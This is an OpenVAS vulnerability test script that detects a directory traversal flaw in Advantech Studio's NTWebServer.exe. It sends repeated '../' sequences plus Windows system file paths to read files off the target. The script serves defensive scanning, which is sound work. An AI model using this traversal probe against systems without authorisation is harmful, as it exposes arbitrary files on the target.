###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_advantech_NTWebServer_56871.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Advantech Studio 'NTWebServer.exe' Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Advantech Studio is prone to a directory-traversal vulnerability
because it fails to sufficiently sanitize user-supplied input.

A remote attacker can use directory-traversal strings to retrieve
arbitrary files in the context of the affected application.

Advantech Studio 7.0 is vulnerable; other versions may also be
affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103636";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56871);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_version ("$Revision: 7577 $");

 script_name("Advantech Studio 'NTWebServer.exe' Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56871");
 script_xref(name : "URL" , value : "http://www.advantech.com/products/Advantech-Studio/mod_3D1B45B0-B0AF-405C-A9CC-A27B35774634.aspx");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2013-01-07 11:53:56 +0100 (Mon, 07 Jan 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = '/startup.html';
if(!http_vuln_check(port:port, url:url,pattern:'Advantech')) {
  exit(0);
}  

files = traversal_files('windows');

foreach file(keys(files)) {

  url = crap(data:"../", length:9*6) + files[file];

  if(http_vuln_check(port:port, url:url,pattern:file)) {
    report = report_vuln_url( port:port, url:url ); 
    security_message(port:port, data:report);
    exit(0);

  }
}

exit(0);
